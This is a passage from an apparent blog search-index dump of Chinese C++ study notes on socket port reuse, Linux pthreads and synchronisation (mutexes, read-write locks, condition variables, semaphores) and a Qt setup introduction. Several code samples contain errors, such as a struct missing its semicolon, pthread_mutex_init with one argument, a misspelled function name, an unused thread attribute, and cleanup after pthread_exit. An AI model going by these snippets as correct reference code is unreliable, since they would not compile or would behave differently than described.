所以这个时候需要使用端口复用 端口复用最常用的用途是: 防止服务器重启时之前绑定的端口还未释放 程序突然退出而系统没有释放端口 通过一个系统的API实现 1234567891011121314151617#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);//设置套接字的属性（不仅仅能设置端口复用）//参数：//- sockfd：要操作的文件描述符//- level：级别 - SOLSOCKET(端口复用的级别)//- optname：选项的名称// - SO_REUSEADDR// - SO_REUSEPORT//- optval：端口复用的值（整形）// - 1：可以复用// - 0：不可以复用//- optlen：optval参数的大小//端口复用，设置的时机是在服务器绑定端口之前//setsockopt();//bind(); 在开启端口复用之后，断开server，在TIME_WAIT状态可以再次打开一个server","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"网络编程","slug":"编程语言/C/网络编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 Linux系统编程 线程","slug":"C++-学习-Linux系统编程-线程","date":"2023-05-15T05:40:29.000Z","updated":"2023-05-19T13:00:07.188Z","comments":true,"path":"2023/05/15/C++-学习-Linux系统编程-线程/","link":"","permalink":"http://example.com/2023/05/15/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E7%BA%BF%E7%A8%8B/","excerpt":"线程概述线程 与进程（process）类似，线程（thread）是允许应用程序并发执行多个任务的一种机制。一个进程可以包含多个线程。同一个程序中的所有线程均会独立执行相同程序，且共享同一份全局内存区域，其中包括初始化数据段、未初始化数据段，以及堆内存段。（传统意义上的 UNIX 进程只是多线程程序的一个特例，该进程只包含一个线程） 进程是 CPU 分配资源的最小单位，线程是操作系统调度执行的最小单位。 线程是轻量级的进程（LWP：Light Weight Process），在 Linux 环境下线程的本质仍是进程。 查看指定进程的 LWP （线程）号：ps –Lf pid","text":"线程概述线程 与进程（process）类似，线程（thread）是允许应用程序并发执行多个任务的一种机制。一个进程可以包含多个线程。同一个程序中的所有线程均会独立执行相同程序，且共享同一份全局内存区域，其中包括初始化数据段、未初始化数据段，以及堆内存段。（传统意义上的 UNIX 进程只是多线程程序的一个特例，该进程只包含一个线程） 进程是 CPU 分配资源的最小单位，线程是操作系统调度执行的最小单位。 线程是轻量级的进程（LWP：Light Weight Process），在 Linux 环境下线程的本质仍是进程。 查看指定进程的 LWP （线程）号：ps –Lf pid 进程和线程区别 进程间的信息难以共享。由于除去只读代码段外，父子进程并未共享内存，因此必须采用一些进程间通信方式，在进程间进行信息交换。 调用 fork() 来创建进程的代价相对较高，即便利用写时复制技术，仍然需要复制诸如内存页表和文件描述符表之类的多种进程属性，这意味着 fork() 调用在时间上的开销依然不菲。 线程之间能够方便、快速地共享信息。只需将数据复制到共享（全局或堆）变量中即可。 创建线程比创建进程通常要快 10 倍甚至更多。线程间是共享虚拟地址空间的，无需采用写时复制来复制内存，也无需复制页表 线程之间共享和非共享资源 共享资源 进程 ID 和父进程 ID 进程组 ID 和会话 ID 用户 ID 和 用户组 ID 文件描述符表 信号处置 文件系统的相关信息：文件权限掩码（umask）、当前工作目录 虚拟地址空间（除栈、.text） 非共享资源 线程 ID 信号掩码 线程特有数据 error 变量 实时调度策略和优先级 栈，本地变量和函数的调用链接信息 NPTL 当 Linux 最初开发时，在内核中并不能真正支持线程。但是它的确可以通过 clone() 系统调用将进程作为可调度的实体。这个调用创建了调用进程（calling process）的一个拷贝，这个拷贝与调用进程共享相同的地址空间。LinuxThreads 项目使用这个调用来完成在用户空间模拟对线程的支持。不幸的是，这种方法有一些缺点，尤其是在信号处理、调度和进程间同步等方面都存在问题。另外，这个线程模型也不符合 POSIX 的要求。 要改进 LinuxThreads，需要内核的支持，并且重写线程库。有两个相互竞争的项目开始来满足这些要求。一个包括 IBM 的开发人员的团队开展了 NGPT（Next-Generation POSIX Threads）项目。同时，Red Hat 的一些开发人员开展了 NPTL 项目。NGPT 在 2003 年中期被放弃了，把这个领域完全留给了 NPTL。 NPTL，或称为 Native POSIX Thread Library，是 Linux 线程的一个新实现，它克服了 LinuxThreads 的缺点，同时也符合 POSIX 的需求。与 LinuxThreads 相比，它在性能和稳定性方面都提供了重大的改进。 查看当前 pthread 库版本：getconf GNU_LIBPTHREAD_VERSION 线程操作进程创建12345678910111213141516171819// 一般情况下, main函数所在的线程我们称之为主线程（main线程），其余创建的线程// 称之为子线程。// 程序中默认只有一个进程，fork()函数调用，2进行// 程序中默认只有一个线程，pthread_create()函数调用，2个线程。#include &lt;pthread.h&gt;int pthread_create(pthread_t* thread, const pthread_attr_t* attr, void* (*start_routine) (void*), void* arg);// -功能：创建一个子线程// - 参数：// - thread：传出参数，线程创建成功后，子线程的线程ID被写到该变量中。// - attr : 设置线程的属性，一般使用默认值，NULL// - start_routine : 函数指针，这个函数是子线程需要处理的逻辑代码// - arg : 给第三个参数使用，传参// - 返回值：// 成功：0// 失败：返回错误号。这个错误号和之前errno不太一样。// 获取错误号的信息： char* strerror(int errnum); pthread_create不是标准库定义的调用，所以在编译时需要连接第三方的库 -pthread 案例 12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;void* callback(void* arg)&#123; printf(&quot;child thread . . .\\n&quot;); printf(&quot;arg value = %d\\n&quot;, *(int*)arg);&#125;int main()&#123; //创建一个子线程 pthread_t tid; int num = 10; int ret = pthread_create(&amp;tid, NULL, callback, (void*)&amp;num); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error : %s\\n&quot;, errstr); &#125; for (int i = 0;i &lt; 5;i++) &#123; printf(&quot;%d\\n&quot;, i); &#125; sleep(1);&#125; 编译运行结果为： 终止线程1234567891011121314#include &lt;pthread.h&gt;void pthread_exit(void* retval);// 功能：终止一个线程，在哪个线程中调用，就表示终止哪个线程// 参数：// retval : 需要传递一个指针，作为一个返回值，可以在pthread_join()中获取到。pthread_t pthread_self(void);// 功能：获取当前的线程的线程IDint pthread_equal(pthread_t t1, pthread_t t2);// 功能：比较两个线程ID是否相等// 不同的操作系统，pthread_t类型的实现不一样，有的是无符号的长整型，有的// 是使用结构体去实现的。//一般跨平台等等必须要使用 案例 12345678910111213141516171819202122232425262728293031#include&lt;pthread.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;void* callback(void* arg)&#123; printf(&quot;child thread id : %ld\\n&quot;, pthread_self()); return NULL;&#125;int main()&#123; //创建一个子线程 pthread_t tid; int ret = pthread_create(&amp;tid, NULL, callback, NULL); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error : %s\\n&quot;, errstr); &#125; //主线程 for (int i = 0;i &lt; 50;i++) &#123; printf(&quot;%d\\n&quot;, i); &#125; printf(&quot;tid : %ld, main thread id : %ld\\n&quot;, tid, pthread_self()); //让主线程退出,当主线程退出时，不会影响其他 pthread_exit(NULL);&#125; 连接已终止的进程123456789101112#include &lt;pthread.h&gt;int pthread_join(pthread_t thread, void **retval); // - 功能：和一个已经终止的线程进行连接 // 回收子线程的资源 // 这个函数是阻塞函数，调用一次只能回收一个子线程 // 一般在主线程中使用 // - 参数： // - thread：需要回收的子线程的ID // - retval: 接收子线程退出时的返回值 // - 返回值： // 0 : 成功 // 非0 : 失败，返回的错误号 案例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;pthread.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;int value = 10;void* callback(void* arg)&#123; printf(&quot;child thread id : %ld\\n&quot;, pthread_self()); sleep(3); pthread_exit((void*)&amp;value);//return (void *)&amp;value;&#125;int main()&#123; //创建一个子线程 pthread_t tid; int ret = pthread_create(&amp;tid, NULL, callback, NULL); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error : %s\\n&quot;, errstr); &#125; //主线程 for (int i = 0;i &lt; 5;i++) &#123; printf(&quot;%d\\n&quot;, i); &#125; printf(&quot;tid : %ld, main thread id : %ld\\n&quot;, tid, pthread_self()); //主线程调用pthread_join()回收子线程的资源 int* thread_retval; ret = pthread_join(tid, (void**)&amp;thread_retval); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error : %s\\n&quot;, errstr); &#125; printf(&quot;exit data : %d\\n&quot;, *thread_retval); printf(&quot;回收子线程资源成功\\n&quot;); //让主线程退出,当主线程退出时，不会影响其他 pthread_exit(NULL);&#125; 编译运行 线程的分离123456789#include &lt;pthread.h&gt;int pthread_detach(pthread_t thread); // - 功能：分离一个线程。被分离的线程在终止的时候，会自动释放资源返回给系统。 // 1.不能多次分离，会产生不可预料的行为。 // 2.不能去连接一个已经分离的线程，会报错。 // - 参数：需要分离的线程的ID // - 返回值： // 成功：0 // 失败：返回错误号 案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;pthread.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;void* callback(void* arg)&#123; printf(&quot;child thread id : %ld\\n&quot;, pthread_self()); return NULL;&#125;int main()&#123; //创建一个子线程 pthread_t tid; int ret = pthread_create(&amp;tid, NULL, callback, NULL); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error1 : %s\\n&quot;, errstr); &#125; //输出主线程和子线程的ID printf(&quot;tid : %ld, main thread id : %ld\\n&quot;, tid, pthread_self()); //设置子线程分离,子线程分离后，子线程结束时对应的资源就不需要主线程释放 ret = pthread_detach(tid); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error2 : %s\\n&quot;, errstr); &#125; //设置分离以后，对分离的子线程进行连接 pthread_join() ret = pthread_join(tid, NULL); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error3 : %s\\n&quot;, errstr); &#125; pthread_exit(NULL);&#125; 编译运行 线程取消123456#include &lt;pthread.h&gt;int pthread_cancel(pthread_t thread); // - 功能：取消线程（让线程终止） // 取消某个线程，可以终止某个线程的运行， // 但是并不是立马终止，而是当子线程执行到一个取消点，线程才会终止。 // 取消点：系统规定好的一些系统调用，我们可以粗略的理解为从用户区到内核区的切换，这个位置称之为取消点。 案例 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;pthread.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;void* callback(void* arg)&#123; printf(&quot;child thread id : %ld\\n&quot;, pthread_self()); for (int i = 0;i &lt; 5;i++) &#123; printf(&quot;child : %d\\n&quot;, i); &#125; return NULL;&#125;int main()&#123; //创建一个子线程 pthread_t tid; int ret = pthread_create(&amp;tid, NULL, callback, NULL); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error1 : %s\\n&quot;, errstr); &#125; //取消线程 pthread_cancel(tid); for (int i = 0;i &lt; 5;i++) &#123; printf(&quot;%d\\n&quot;, i); &#125; //输出主线程和子线程的ID printf(&quot;tid : %ld, main thread id : %ld\\n&quot;, tid, pthread_self()); pthread_exit(NULL);&#125; 编译运行 线程属性1234567891011int pthread_attr_init(pthread_attr_t *attr); //- 初始化线程属性变量int pthread_attr_destroy(pthread_attr_t *attr); //- 释放线程属性的资源int pthread_attr_getdetachstate(const pthread_attr_t *attr, int *detachstate); //- 获取线程分离的状态属性int pthread_attr_setdetachstate(pthread_attr_t *attr, int detachstate); //- 设置线程分离的状态属性 案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;pthread.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;void* callback(void* arg)&#123; printf(&quot;child thread id : %ld\\n&quot;, pthread_self()); return NULL;&#125;int main()&#123; //创建一个线程属性变量 pthread_attr_t attr; //初始化属性变量 pthread_attr_init(&amp;attr); //设置属性 pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_DETACHED); //创建一个子线程 pthread_t tid; int ret = pthread_create(&amp;tid, NULL, callback, NULL); if (ret != 0) &#123; char* errstr = strerror(ret); printf(&quot;error1 : %s\\n&quot;, errstr); &#125; //输出主线程和子线程的ID printf(&quot;tid : %ld, main thread id : %ld\\n&quot;, tid, pthread_self()); //获取线程的栈的大小 size_t size; pthread_attr_getstacksize(&amp;attr, &amp;size); printf(&quot;thread stack size : %ld\\n&quot;, size); //释放线程属性资源 pthread_attr_destroy(&amp;attr); pthread_exit(NULL);&#125; 编译运行 线程同步 线程的主要优势在于，能够通过全局变量来共享信息。不过，这种便捷的共享是有代价的：必须确保多个线程不会同时修改同一变量，或者某一线程不会读取正在由其他线程修改的变量。 临界区是指访问某一共享资源的代码片段，并且这段代码的执行应为原子操作，也就是同时访问同一共享资源的其他线程不应终端该片段的执行。 线程同步：即当有一个线程在对内存进行操作时，其他线程都不可以对这个内存地址进行操作，直到该线程完成操作，其他线程才能对该内存地址进行操作，而其他线程则处于等待状态。 互斥量 为避免线程更新共享变量时出现问题，可以使用互斥量（mutex 是 mutual exclusion的缩写）来确保同时仅有一个线程可以访问某项共享资源。可以使用互斥量来保证对任意共享资源的原子访问。 互斥量有两种状态：已锁定（locked）和未锁定（unlocked）。任何时候，至多只有一个线程可以锁定该互斥量。试图对已经锁定的某一互斥量再次加锁，将可能阻塞线程或者报错失败，具体取决于加锁时使用的方法。 一旦线程锁定互斥量，随即成为该互斥量的所有者，只有所有者才能给互斥量解锁。一般情况下，对每一共享资源（可能由多个相关变量组成）会使用不同的互斥量，每一线程在访问同一资源时将采用如下协议： 针对共享资源锁定互斥量 访问共享资源 对互斥量解锁 如果多个线程试图执行这一块代码（一个临界区），事实上只有一个线程能够持有该互斥量（其他线程将遭到阻塞），即同时只有一个线程能够进入这段代码区域，如下图所示： 案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172//使用多线程实现卖票案例//有3个窗口，一共是100张票#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;int tickets = 100;//全局变量，所有线程都共享这一份资源//创建一个互斥量pthread_mutex_t mutex;void* sellticket(void* arg)&#123; //卖票 while (1) &#123; //加锁 pthread_mutex_lock(&amp;mutex); if (tickets &gt; 0) &#123; printf(&quot;%ld 正在卖第 %d 张门票\\n&quot;, pthread_self(), tickets); tickets--; &#125; else &#123; //解锁 pthread_mutex_unlock(&amp;mutex); break; &#125; //解锁 pthread_mutex_unlock(&amp;mutex); &#125; return NULL;&#125;int main()&#123; //初始化互斥量 pthread_mutex_init(&amp;mutex, NULL); //创建三个子线程 pthread_t tid1, tid2, tid3; pthread_create(&amp;tid1, NULL, sellticket, NULL); pthread_create(&amp;tid2, NULL, sellticket, NULL); pthread_create(&amp;tid3, NULL, sellticket, NULL); //回收子线程的资源,阻塞的函数 pthread_join(tid1, NULL); pthread_join(tid2, NULL); pthread_join(tid3, NULL); //设置线程分离 pthread_detach(tid1); pthread_detach(tid2); pthread_detach(tid3); pthread_exit(NULL);//退出主线程 //释放互斥量资源 pthread_mutex_destroy(&amp;mutex);&#125; 死锁 有时，一个线程需要同时访问两个或更多不同的共享资源，而每个资源又都由不同的互斥量管理。当超过一个线程加锁同一组互斥量时，就有可能发生死锁。 两个或两个以上的进程在执行过程中，因争夺共享资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁。 死锁的几种场景： 忘记释放锁 重复加锁 多线程多锁，抢占锁资源 读写锁 当有一个线程已经持有互斥锁时，互斥锁将所有试图进入临界区的线程都阻塞住。但是考虑一种情形，当前持有互斥锁的线程只是要读访问共享资源，而同时有其它几个线程也想读取这个共享资源，但是由于互斥锁的排它性，所有其它线程都无法获取锁，也就无法读访问共享资源了，但是实际上多个线程同时读访问共享资源并不会导致问题。 在对数据的读写操作中，更多的是读操作，写操作较少，例如对数据库数据的读写应用。为了满足当前能够允许多个读出，但只允许一个写入的需求，线程提供了读写锁来实现。 读写锁的特点： 如果有其它线程读数据，则允许其它线程执行读操作，但不允许写操作。 如果有其它线程写数据，则其它线程都不允许读、写操作。 写是独占的，写的优先级高 12345678// 读写锁的类型 pthread_rwlock_tint pthread_rwlock_init(pthread_rwlock_t *rstrict rwlock, const pthread_rwlockattr_t *restrict attr);int pthread_rwlock_destroy(pthread_rwlock_t *rwlock);int pthread_rwlock_rdlock(pthread_rwlock_t *rwlock);int pthread_rwlock_tryrdlock(pthread_rwlock_t *rwlock);int pthread_rwlock_wrlock(pthread_rwlock_t *rwlock);int pthread_rwlock_trywrlock(pthread_rwlock_t *rwlock);int pthread_rwlock_unlock(pthread_rwlock_t *rwlock); 案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//案例：8个线程操作同一个全局变量//3个线程不定时写这个全局变量，5个线程不定时的读这个全局变量#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;#include&lt;unistd.h&gt;//创建一个共享数据int num = 1;pthread_mutex_t mutex;pthread_rwlock_t rwlock;void* writeNum(void* arg)&#123; while (1) &#123; pthread_rwlock_wrlock(&amp;rwlock); num++; printf(&quot;++write, tid : %ld, num : %d\\n&quot;, pthread_self(), num); pthread_rwlock_unlock(&amp;rwlock); usleep(100); &#125; return NULL;&#125;void* readNum(void* arg)&#123; while (1) &#123; pthread_rwlock_rdlock(&amp;rwlock); printf(&quot;===read,tid : %ld, num : %d\\n&quot;, pthread_self(), num); pthread_rwlock_unlock(&amp;rwlock); usleep(100); &#125; return NULL;&#125;int main()&#123; pthread_rwlock_init(&amp;rwlock, NULL); pthread_t wtids[3], rtids[5];//创建3个写线程，5个读线程 for (int i = 0;i &lt; 3;i++) &#123; pthread_create(&amp;wtids[i], NULL, writeNum, NULL); &#125; for (int i = 0;i &lt; 5;i++) &#123; pthread_create(&amp;rtids[i], NULL, readNum, NULL); &#125; //设置线程分离 for (int i = 0;i &lt; 3;i++) &#123; pthread_detach(wtids[i]); &#125; for (int i = 0;i &lt; 5;i++) &#123; pthread_detach(rtids[i]); &#125; pthread_exit(NULL); pthread_rwlock_destroy(&amp;rwlock);&#125; 生产者消费者模型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697//生产者消费者模型(简单版)#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;pthread_mutex_t mutex;struct Node&#123; int num; struct Node* next; &#125;//头结点struct Node* head = NULL;void* producer(void* arg)&#123; //不断的创建新的节点，添加到链表中 while (1) &#123; pthread_mutex_lock(&amp;mutex); struct Node* newNode = (struct Node*)malloc(sizeof(struct Node)); newNode-&gt;next = head; head = newNode; newNode-&gt;num = rand() % 1000; printf(&quot;add node , num : %d , tid : %ld\\n&quot;, newNode-&gt;num, pthread_self()); pthread_mutex_unlock(&amp;mutex); usleep(100); &#125; return NULL;&#125;void* customer(void* arg)&#123; while (1) &#123; pthread_mutex_lock(&amp;mutex); //保存头节点的指针 struct Node* tmp = head; //判断是否有数据 if (head != NULL) &#123; // 有数据 head = head-&gt;next; printf(&quot;delete node , num : %d , tid : %ld\\n&quot;, tmp-&gt;num, pthread_self()); free(tmp); pthread_mutex_unlock(&amp;mutex); usleep(100); &#125; else &#123; //没有数据 pthread_mutex_unlock(&amp;mutex); &#125; &#125; return NULL;&#125;int main()&#123; pthread_mutex_init(&amp;mutex); //创建5个生产者线程和5个消费者线程 pthread_t ptids[5], ctids[5]; for (int i = 0;i &lt; 5;i++) &#123; pthread_create(&amp;ptids[i], NULL, producer, NULL); pthread_create(&amp;ctids[i], NULL, custmer, NULL); &#125; for (int i = 0;i &lt; 5;i++) &#123; pthread_detach(ptids[i]); pthread_detach(ctids[i]); &#125; while (1) &#123; sleep(10); &#125; while (1) &#123; sleep(10); &#125; pthread_mutex_destroy(&amp;mutex); pthread_exit(NULL);&#125; 这段代码没有处理好一个问题，当有消费者想要消费但是缓冲区已经没有数据的时候，消费者会直接退出，当缓冲区有数据的时候却不会再通知这个消费者，我们需要通过一定手段解决这个问题 条件变量1234567891011// 条件变量的类型 pthread_cond_t int pthread_cond_init(pthread_cond_t *restrict cond, const pthread_condattr_t *restrict attr); int pthread_cond_destroy(pthread_cond_t *cond); int pthread_cond_wait(pthread_cond_t *restrict cond, pthread_mutex_t *restrict mutex); // - 等待，调用了该函数，线程会阻塞。 int pthread_cond_timedwait(pthread_cond_t *restrict cond, pthread_mutex_t *restrict mutex, const struct timespec *restrict abstime); // - 等待多长时间，调用了这个函数，线程会阻塞，直到指定的时间结束。 int pthread_cond_signal(pthread_cond_t *cond); // - 唤醒一个或者多个等待的线程 int pthread_cond_broadcast(pthread_cond_t *cond); // - 唤醒所有的等待的线程 案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108//生产者消费者模型(简单版)#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;pthread_mutex_t mutex;//创建条件变量pthread_cond_t cond;struct Node&#123; int num; struct Node* next;&#125;;//头结点struct Node* head = NULL;void* producer(void* arg)&#123; //不断的创建新的节点，添加到链表中 while (1) &#123; pthread_mutex_lock(&amp;mutex); struct Node* newNode = (struct Node*)malloc(sizeof(struct Node)); newNode-&gt;next = head; head = newNode; newNode-&gt;num = rand() % 1000; printf(&quot;add node , num : %d , tid : %ld\\n&quot;, newNode-&gt;num, pthread_self()); //只要生产了一个就通知消费者消费 pthread_cond_signal(&amp;cond); pthread_mutex_unlock(&amp;mutex); usleep(100); &#125; return NULL;&#125;void* customer(void* arg)&#123; while (1) &#123; pthread_mutex_lock(&amp;mutex); //保存头节点的指针 struct Node* tmp = head; //判断是否有数据 if (head != NULL) &#123; // 有数据 head = head-&gt;next; printf(&quot;del node , num : %d , tid : %ld\\n&quot;, tmp-&gt;num, pthread_self()); free(tmp); pthread_mutex_unlock(&amp;mutex); usleep(100); &#125; else &#123; //没有数据 需要等待 //当这个函数调用阻塞的时候，会对互斥锁进行解锁，当不阻塞时，继续向下执行，会重新加锁。 pthread_cond_wait(&amp;cond, &amp;mutex); pthread_mutex_unlock(&amp;mutex); &#125; &#125; return NULL;&#125;int main()&#123; pthread_mutex_init(&amp;mutex, NULL); pthread_cond_init(&amp;cond, NULL); //创建5个生产者线程和5个消费者线程 pthread_t ptids[5], ctids[5]; for (int i = 0;i &lt; 5;i++) &#123; pthread_create(&amp;ptids[i], NULL, producer, NULL); pthread_create(&amp;ctids[i], NULL, customer, NULL); &#125; for (int i = 0;i &lt; 5;i++) &#123; pthread_detach(ptids[i]); pthread_detach(ctids[i]); &#125; while (1) &#123; sleep(10); &#125; while (1) &#123; sleep(10); &#125; pthread_mutex_destroy(&amp;mutex); pthread_cond_destroy(&amp;cond); pthread_exit(NULL);&#125; 使用条件变量解决上述生产者和消费者的问题。 信号量123456789101112131415161718192021222324252627282930313233343536// 信号量的类型 sem_tint sem_init(sem_t *sem, int pshared, unsigned int value); // - 初始化信号量 // - 参数： // - sem : 信号量变量的地址 // - pshared : 0 用在线程间 ，非0 用在进程间 // - value : 信号量中的值int sem_destroy(sem_t *sem); // - 释放资源int sem_wait(sem_t *sem); // - 对信号量加锁，调用一次对信号量的值-1，如果值为0，就阻塞int sem_trywait(sem_t *sem);int sem_timedwait(sem_t *sem, const struct timespec *abs_timeout);int sem_post(sem_t *sem); // - 对信号量解锁，调用一次对信号量的值+1int sem_getvalue(sem_t *sem, int *sval);// sem_t psem;// sem_t csem;// init(psem, 0, 8);// init(csem, 0, 0);// producer() &#123;// sem_wait(&amp;psem);// sem_post(&amp;csem)// &#125;// customer() &#123;// sem_wait(&amp;csem);// sem_post(&amp;psem)// &#125; 案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101//生产者消费者模型(简单版)#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;semaphore.h&gt;pthread_mutex_t mutex;//创建两个信号量sem_t psem;sem_t csem;struct Node&#123; int num; struct Node* next;&#125;;//头结点struct Node* head = NULL;void* producer(void* arg)&#123; //不断的创建新的节点，添加到链表中 while (1) &#123; sem_wait(&amp;psem); pthread_mutex_lock(&amp;mutex); struct Node* newNode = (struct Node*)malloc(sizeof(struct Node)); newNode-&gt;next = head; head = newNode; newNode-&gt;num = rand() % 1000; printf(&quot;add node , num : %d , tid : %ld\\n&quot;, newNode-&gt;num, pthread_self()); pthread_mutex_unlock(&amp;mutex); sem_post(&amp;csem); usleep(100); &#125; return NULL;&#125;void* customer(void* arg)&#123; while (1) &#123; sem_wait(&amp;csem); pthread_mutex_lock(&amp;mutex); //保存头节点的指针 struct Node* tmp = head; // 有数据 head = head-&gt;next; printf(&quot;del node , num : %d , tid : %ld\\n&quot;, tmp-&gt;num, pthread_self()); free(tmp); pthread_mutex_unlock(&amp;mutex); sem_post(&amp;psem); &#125; return NULL;&#125;int main()&#123; pthread_mutex_init(&amp;mutex, NULL); sem_init(&amp;psem, 0, 8); sem_init(&amp;csem, 0, 0); //创建5个生产者线程和5个消费者线程 pthread_t ptids[5], ctids[5]; for (int i = 0;i &lt; 5;i++) &#123; pthread_create(&amp;ptids[i], NULL, producer, NULL); pthread_create(&amp;ctids[i], NULL, customer, NULL); &#125; for (int i = 0;i &lt; 5;i++) &#123; pthread_detach(ptids[i]); pthread_detach(ctids[i]); &#125; while (1) &#123; sleep(10); &#125; while (1) &#123; sleep(10); &#125; pthread_mutex_destroy(&amp;mutex); pthread_exit(NULL);&#125; 信号量同样解决了上述生产者和消费者的问题","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"线程","slug":"线程","permalink":"http://example.com/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"C++学习 数据库编程","slug":"C++-学习-数据库编程","date":"2023-05-11T06:10:20.000Z","updated":"2023-05-11T10:33:21.034Z","comments":true,"path":"2023/05/11/C++-学习-数据库编程/","link":"","permalink":"http://example.com/2023/05/11/C++-%E5%AD%A6%E4%B9%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/","excerpt":"","text":"Oracle Oracle安装连接：Database Software Downloads | Oracle","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"数据库","slug":"编程语言/C/数据库","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"C++学习 QT简介","slug":"C++-学习-QT简介","date":"2023-05-11T05:39:45.000Z","updated":"2023-05-14T13:37:03.146Z","comments":true,"path":"2023/05/11/C++-学习-QT简介/","link":"","permalink":"http://example.com/2023/05/11/C++-%E5%AD%A6%E4%B9%A0-QT%E7%AE%80%E4%BB%8B/","excerpt":"QT的下载和安装Index of &#x2F; (qt.io) Index of &#x2F;qt&#x2F; | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror","text":"QT的下载和安装Index of &#x2F; (qt.io) Index of &#x2F;qt&#x2F; | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror 下载在线安装包之后 1.\\qt-unified-windows-x64-4.5.2-online.exe --mirror https://mirror.nju.edu.cn/qt 运行这道命令将源换成国内的镜像之后进行安装 Qt创建项目以及main和pro文件的生成Qt创建项目 创建项目 创建步骤 这里我们选择qmake为例子学习，不然没有pro文件，CMake是一个txt文件 我们以QWidget为例 此时QT项目已经创建完成 main文件和pro文件解析main文件 123456789101112131415#include &quot;mywidget.h&quot;#include &lt;QApplication&gt;//应用程序类//程序入口 argv 命令行变量数量 命令行变量数组int main(int argc, char *argv[])&#123; //a 应用程序对象，在Qt中应用程序对象有且仅有一个 QApplication a(argc, argv); //通过窗口类实例化对象 w MyWidget w; //窗口是不会默认弹出的，需要调用show方法进行显示 w.show(); //a.exec();进入消息循环机制 阻塞功能 return a.exec();&#125; pro文件 123456789101112131415161718192021QT += core gui //Qt包含的模块greaterThan(QT_MAJOR_VERSION, 4): QT += widgets //大于4版本 加入widget模块CONFIG += c++17# You can make your code fail to compile if it uses deprecated APIs.# In order to do so, uncomment the following line.#DEFINES += QT_DISABLE_DEPRECATED_BEFORE=0x060000 # disables all the APIs deprecated before Qt 6.0.0SOURCES += \\ main.cpp \\ mywidget.cpp //源文件HEADERS += \\ mywidget.h //头文件# Default rules for deployment.qnx: target.path = 